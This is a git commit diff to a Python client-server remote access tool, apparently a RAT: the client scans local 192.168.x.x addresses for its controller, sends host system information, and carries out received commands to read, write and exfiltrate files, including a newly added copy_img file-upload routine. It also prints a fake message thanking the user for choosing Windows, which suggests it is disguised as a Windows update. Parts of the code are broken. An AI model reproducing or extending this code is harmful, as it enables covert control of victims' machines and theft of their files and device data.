6383800adb23c237ace79bfea487871a68e3204c
sreenath yadav <72072951+sreenathyadavk@users.noreply.github.com>
2022-11-05 07:22:34 +0530

    version 2

--- Server.py
+++ Server.py
@@ -3,6 +3,10 @@ import socket
 import sys
 import os
 
+global conn_number
+conn_number = 0
+print('conn_number = 0')
+
 
 def device_log(conn_device_log):
     global path
@@ -15,7 +19,7 @@ def device_log(conn_device_log):
     global dn
     dn = str(device_data["hostname"])
     try:
-        path = os.path.join(desktop+"/Resources/Connected log/Devices/", str(device_data["hostname"]))
+        path = os.path.join(desktop + "/Resources/Connected log/Devices/", str(device_data["hostname"]))
         os.mkdir(path)
     except OSError as error:
         print(error)
@@ -54,13 +58,19 @@ def bind_socket():
         global port
         global s
         global Addr
+        global conn_number
         Addr = (host, port)
         print('Binding the port & host' + str(Addr))
         s.bind(Addr)
+        conn_number = conn_number + 2
         s.listen(3)  # no . of connection , should accept , if limit reach out then Error
         print('Waiting of client...')
     except socket.error as msg:
         print(str(msg))
+
+
+# global CONN_IMG
+# CONN_IMG = False
 
 
 def send_command(conn):
@@ -73,7 +83,7 @@ def send_command(conn):
           "CASE SENSITIVE]")
     print("2) TO READ FILES , TYPE -> 'read' <- **[WITH OUT QUOTES, CASE SENSITIVE]")
     print("3) TO GET DEVICE INFORMATION , TYPE ->'device_info <-'**' [WITH OUT QUOTES, CASE SENSITIVE]")
-    print("3) TO EXIT , TYPE -> 'quit' <- **[WITH OUT QUOTES, CASE SENSITIVE]")
+    print("3) TO EXIT , TYPE -> 'quit_app' <- **[WITH OUT QUOTES, CASE SENSITIVE]")
     print("***********************************TIPS***************************")
 
     conn_device_log = conn.recv(2000).decode('utf-8')
@@ -81,48 +91,59 @@ def send_command(conn):
     device_log(conn_device_log)
     print(conn_device_log)
     while True:
-
+        global CONN_IMG
         cmd = input('Send Command [CMD] : ')
-        if cmd == 'quit':
+
+        if cmd == 'quit_app':
+            global CONN_IMG
+            CONN_IMG = False
             conn.send(str.encode(cmd))
-            conn.close()
-            sys.exit()
-        if cmd == "copy_img":
-            conn.send(str.encode(cmd))
-            respone_size += 20000
-            print("****************************WARNING**********************************")
-            print("[RESPONSE SIZE]...", 'Current Max Bytes for This Response : ', respone_size, "....")
-            print('Keep your Eye ...', 'This Response is Constantly updating by 20,000 Bytes per a single request: ',
-                  respone_size)
-            print("****************************WARNING**********************************")
-            line += 1
             client_response = str(conn.recv(respone_size), 'utf-8')
-            img_file_name = input(('Response : ', client_response, "line : ", line))
-            conn.send(str.encode(img_file_name))
-            save_img = str(conn.recv(80000), 'utf-8')
-            # save_img = bytes.decode(save_img)
-            print('recied')
-            save_img = bytes(save_img,'utf-8')
-            print(save_img, type(save_img))
-            if img_file_name[-3:] == "JPG":
-                exe = "jpg"
-                img_file_name = img_file_name[:-3]
-                fw_j = open(path + "/" + img_file_name + exe, 'wb')
-                for line_j in save_img:
-                    fw_j.write(line_j)
-                    fw_j.close()
-            else:
-                exe = "png"
-                img_file_name = img_file_name[:-3]
-                fw_p = open(dn + "/" + img_file_name + exe, 'wb')
-                for line_p in save_img:
-                    fw_p.write(bytes(line_p))
-                    fw_p.close()
-            print('op')
+            conn.close()
+            print(client_response)
+            sys.exit()
+        if cmd == 'help':
+            CONN_IMG = False
+            print("***********************************HELP-COMMAND-CALLED***************************")
+            print("1) TO EDIT EXISTING FILE OR CREATE NEW FILE AND WRITE DATA , TYPE -> 'edit' <- **[WITH OUT QUOTES , "
+                  "CASE SENSITIVE]")
+            print("2) TO READ FILES , TYPE -> 'read' <- **[WITH OUT QUOTES, CASE SENSITIVE]")
+            print("3) TO GET DEVICE INFORMATION , TYPE ->'device_info <-'**' [WITH OUT QUOTES, CASE SENSITIVE]")
+            print("3) TO EXIT , TYPE -> 'quit_app' <- **[WITH OUT QUOTES, CASE SENSITIVE]")
+            print("***********************************HELP-COMMAND-CALLED***************************")
 
-            print('------FILE SUCCESSFULLY SAVED AS ' + cmd + "---------")
+        if cmd == "copy_img":
+            # Fname = input("Enter file name with in the local directory... [img response size changed to 10000000(10mb)] : ")
+            conn.send(str.encode(cmd))
+            CONN_IMG = True
+            client_response = str(conn.recv(respone_size), 'utf-8')
+         #   print(client_response)
+            Fname = input(client_response)
+            conn.send(str.encode(Fname))
+            if s.recv(respone_size).__eq__("CI-000"):
+                respone_size = 1000000000000000000000000000
+               # respone_size=108000
+                print(respone_size)
+                s.send(str.encode("CI-000-accepted"))
+                print('ci-00-acc')
+                file_name = s.recv(respone_size).decode('utf-8')
+                s.send(str.encode("ID-ACCEPTED"))
+                print('id-acc')
+                CI_DATA = s.recv(respone_size).decode('utf-8')
+                print("SUCCESSFULLY RECEIVED CI_DATA...")
+                # open(file_name,'w')
+                print(CI_DATA)
+                print(type(CI_DATA))
+                print(file_name)
 
-        if len(str.encode(cmd)) > 0:
+            # respone_size = 10000000
+            # IMG_DATA = str(conn.recv(respone_size).decode('utf=8'))
+            # print(IMG_DATA)
+            # writter = open('xxx.txt', 'wb')
+            # writter.write(bytes(IMG_DATA, encoding='utf8'))
+
+        if len(str.encode(cmd)) > 0 and cmd != 'help':
+            CONN_IMG = False
             conn.send(str.encode(cmd))
             client_response = str(conn.recv(respone_size), 'utf-8')
             # client_response = str(conn.recv(20000),'utf-8')
@@ -134,7 +155,8 @@ def send_command(conn):
             print("****************************WARNING**********************************")
             line += 1
             print('Response : ', client_response, "line : ", line)
-
+        if CONN_IMG:
+            pass
 
 def socket_accept():
     conn, addr = s.accept()  # indirectly conn = socket
--- c.py
+++ c.py
@@ -2,6 +2,7 @@ import socket
 import os
 import subprocess
 # import re
+import sys
 import time
 import platform, socket, re, uuid, json, logging
 
@@ -15,6 +16,7 @@ port = 9898
 # port = socket.getprotobyname('127.0.0.1')
 respone_size = 30000
 TO_EXIT_CHECK = False
+isConnected = False
 
 
 def getSystemInfo():
@@ -84,6 +86,9 @@ def client_main_choice():
     if data[:2].decode('utf-8') == "cd":
         os.chdir(data[3:].decode('utf-8'))
     if len(data) > 0:
+        if data.decode('utf=8') == "copy_img":
+            copy_img_worker()
+
         if data.decode('utf-8') == "edit":
             # s.send(str.encode(input('Enter file name with in the local directory... : ')))
             # s.send(file_name = str(input('Enter file name with in the local directory... : ')))
@@ -106,7 +111,6 @@ def client_main_choice():
                 war = "*****************ERROR IN WRITING DATA INTO FILES**************************"
                 war_msg = war + '\n' + Wmsg
                 s.send(str.encode(war_msg))
-
         if data.decode('utf-8') == "read":
             # file_name = str(input('Enter file name with in the local directory... : '))
             s.send(str.encode('Enter file name with in the local directory... : '))
@@ -130,7 +134,6 @@ def client_main_choice():
                 MSG_SYS_SEND: MSG_SYS_UP + str(getSystemInfo()) + MSG_SYS_DWN
                 s.send(str.encode(MSG_SYS_SEND))
                 # print(json.loads(getSystemInfo()))
-
             except Exception as e:
                 print("Error at fetching system info.....")
                 s.send(str.encode("Error at fetching system info.....", str(Exception.__cause__)))
@@ -141,7 +144,7 @@ def client_main_choice():
             print("LOOKS NO NEW UPDATE FOUND IN OUR SERVERS... , THANKS FOR CHOOSING WINDOWS. :)")
             print('This terminal closes in next 6 seconds....')
             time.sleep(6)
-            exit()
+            sys.exit()
             global TO_EXIT_CHECK
             TO_EXIT_CHECK = True
 
@@ -158,11 +161,30 @@ def client_main_choice():
             # read_file_as_text('h.txt')
 
 
+def copy_img_worker():
+    global respone_size
+    respone_size = 50000
+    s.send(
+        str.encode('Enter file name with in the local directory... [img response size changed to 10000000(10mb)] : '))
+    file_name = s.recv(respone_size).decode('utf-8')
+    FReader = open(str(file_name), 'rb')
+    print(FReader.read())
+    respone_size = 100000000000000000000
+    #respone_size=108000
+    IMG_DATA = str(FReader.read())
+    FReader.close()
+    s.send(str.encode("CI-000"))
+    CI_COMMAND=s.recv(respone_size).decode('utf-8')
+    print(CI_COMMAND)
+    if s.recv(respone_size).decode('utf-8').__eq__("CI-000-accepted"):
+        s.send(str.encode(file_name))
+        if s.recv(respone_size).decode('utf-8').__eq__("ID-ACCEPTED"):
+            s.send(str.encode(IMG_DATA))
+
+
 # Make a regular expression
 # for validating an Ip-address
 # regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
-
-
 # Define a function for
 # validate an Ip address
 # def check(Ip):
@@ -172,8 +194,6 @@ def client_main_choice():
 #         True
 #     else:
 #         False
-
-
 def Server_Client_Connection_Main(ip):
     global host, data, respone_size
     close_conn = False
@@ -199,7 +219,7 @@ def Server_Client_Connection_Main(ip):
     s.send(str.encode(getSystemInfo()))
     while True:
         respone_size += 20000
-        data = s.recv(1024)
+        data = s.recv(10000)
         try:
             client_main_choice()
         except:
@@ -236,65 +256,59 @@ ip_s = [ip1, ip2, ip3, ip4, ip5, ip6, ip7, ip8, ip9, ip11]
 def ips():
     global host, port, ip_s
     print(host)
-
     # ip_s = []
     # ip_s = ["192.168.0.108","192.168.0.107"]
     print(ip_s)
+    def connect(l):
+        global TO_EXIT_CHECK,isConnected
+        if TO_EXIT_CHECK:
+            exit(0)
+        #for conn in range(len(ip_s)):
+        # for cc in range(300):
+            # try:
+            #     global ip
+            #     print("ip-conn:", ip_s[conn])
+            #     if l:
+            #         if len(ip_s) != 1:
+            #             ip = ip_s[conn] - 1
+            #         else:
+            #             ip = ip_s[conn]
+            #     server_addr = (ip_s[conn], port)
+            #     print(server_addr)
+            #     # s.connect(server_addr)
+            #     Server_Client_Connection_Main(ip=ip)
+            #     print('connected')
+            # except:
+            #     if TO_EXIT_CHECK:
+            #         exit()
+            #     # if cc == 300:
+            #     print('conn:', ip_s[conn])
+            #     ip_s.remove(ip_s[conn])
+            #     print('removed ', ip_s, '/n', 'r = ', ip_s[conn], 'type:', type(ip_s[conn]), type(ip_s[conn]))
+            #     print("starting connect@")
+            #     connect(l=True)
 
-
-# jinips=100
-def connect(l):
-    print('connect method called')
-    global TO_EXIT_CHECK, jinips
-    if TO_EXIT_CHECK:
-        exit()
-        # for conn in range(len(ip_s)):
-        #     # for cc in range(300):
-        #     try:
-        #         global ip
-        #         print("ip-conn:", ip_s[conn])
-        #         if l:
-        #             if len(ip_s) != 1:
-        #                 ip = ip_s[conn] - 1
-        #             else:
-        #                 ip = ip_s[conn]
-        #         server_addr = (ip_s[conn], port)
-        #         print(server_addr)
-        #         # s.connect(server_addr)
-        #         Server_Client_Connection_Main(ip=ip)
-        #         print('connected')
-        #
-        #     except:
-        #         if TO_EXIT_CHECK:
-        #             exit()
-        #         # if cc == 300:
-        #         print('conn:', ip_s[conn])
-        #         ip_s.remove(ip_s[conn])
-        #         print('removed ', ip_s, '/n', 'r = ', ip_s[conn], 'type:', type(ip_s[conn]), type(ip_s[conn]))
-        #         print("starting connect@")
-        #         connect(l=True)
-    for iinips in range(225):
-        ipin1 = iinips
-        print('main ip : ', ipin1)
-        for jinips in range(225):
-            ipin2 = jinips
-            print('sub ip : ', ipin2)
-            finalIp = '192.168.' + str(ipin1) + '.' + str(ipin2)
-            try:
-                ip = finalIp
-                server_addr = (finalIp, port)
-                print(server_addr)
-                # s.connect(server_addr)
-                isConnected = Server_Client_Connection_Main(ip=finalIp)
+        if not isConnected:
+            for iinips in range(225):
+                ipin1 = iinips
+                # print('main ip : ', ipin1)
+                for jinips in range(100,225):
+                    ipin2 = jinips
+                    # print('sub ip : ', ipin2)
+                    finalIp = '192.168.' + str(ipin1) + '.' + str(ipin2)
+                    try:
+                        # global ip
+                        server_addr = (finalIp, port)
+                        # print(server_addr)
+                        # s.connect(server_addr)
+                        isConnected =Server_Client_Connection_Main(ip=finalIp)
+                        if isConnected:
+                            break
+                        print('connected')
+                    except:
+                        pass
                 if isConnected:
                     break
-                    break
-                    print("LOOP-OUT-EXITING...")
-                    exit()
-                print('connected')
-            except:
-                pass
-
     connect(l=False)
 
 
@@ -308,7 +322,6 @@ ips()
 #                       "LAST..............."))
 #     while True:
 #         Server_Client_Connection_Main(ip=ip)
-
 # if check(ip):
 #
 #
@@ -317,7 +330,6 @@ ips()
 #     print("Seems its Invalid Ip Address")
 #     print("Try Again..... , by double clicking file or run it in cmd")
 #     exit()
-
 # ---------------safe---code----------
 # while True:
 #     d = data
@@ -336,7 +348,6 @@ ips()
 #                 s.send(str.encode('Editing File Over.... 2'))
 #                 f.close()
 #                 break
-
 #
 # +-
 # +----
@@ -394,3 +405,5 @@ ips()
 #             print(output_str)
 #             print('===========================================================')
 #             read_file_as_text('h.txt')
+
+
